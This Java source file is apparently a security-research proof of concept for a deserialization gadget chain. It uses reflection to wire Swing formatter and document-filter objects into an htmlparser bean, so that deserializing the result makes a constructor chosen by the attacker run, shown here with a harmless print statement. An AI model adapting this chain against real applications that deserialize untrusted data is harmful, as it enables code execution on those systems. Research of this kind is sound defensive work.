package ses.poc.javaxTextComponent;


import org.htmlparser.beans.HTMLTextBean;
import org.htmlparser.beans.StringBean;
import ses.poc.Caller;
import ses.poc.SerializationUtils;

import javax.naming.NamingException;
import javax.swing.*;
import javax.swing.text.*;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

public class Main {

    public static void main(String[] args) throws NamingException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, InstantiationException, InvocationTargetException {

        NumberFormatter numberFormatter = new NumberFormatter();
        numberFormatter.setValueClass(Main.class);

        JFormattedTextField textField = new JFormattedTextField();
        textField.setText("100");

        Field formattedTextField = JFormattedTextField.AbstractFormatter.class.getDeclaredField("ftf");
        formattedTextField.setAccessible(true);
        formattedTextField.set(numberFormatter, textField);

        Field allowsInvalidField = DefaultFormatter.class.getDeclaredField("allowsInvalid");
        allowsInvalidField.setAccessible(true);
        allowsInvalidField.set(numberFormatter, false);

        Class filterClass = Class.forName("javax.swing.text.DefaultFormatter$DefaultDocumentFilter");
        Constructor filterCtor = filterClass.getDeclaredConstructors()[0];
        filterCtor.setAccessible(true);

        DocumentFilter filter = (DocumentFilter) filterCtor.newInstance(numberFormatter);

        AbstractDocument doc = new PlainDocument();
        Field filterField = AbstractDocument.class.getDeclaredField("documentFilter");
        filterField.setAccessible(true);
        filterField.set(doc, filter);


        HTMLTextBean textBean = new HTMLTextBean();
        textBean.setDocument(doc);
        Field mStringsField = StringBean.class.getDeclaredField("mStrings");
        mStringsField.setAccessible(true);
        mStringsField.set(textBean.getBean(), "-");

        //textBean.propertyChange(new PropertyChangeEvent(new Foo(), StringBean.PROP_STRINGS_PROPERTY, "", ""));
        Caller caller = new Caller();
        caller.listener = textBean;
        SerializationUtils.serializeDeserialize(caller);
    }

    public Main(String string) {
        System.out.println("Incroyable");
    }

    public static void serializeDeserialize(Object o) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(o);
        out.flush();
        bos.flush();

        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray()));
        in.readObject();
    }

}
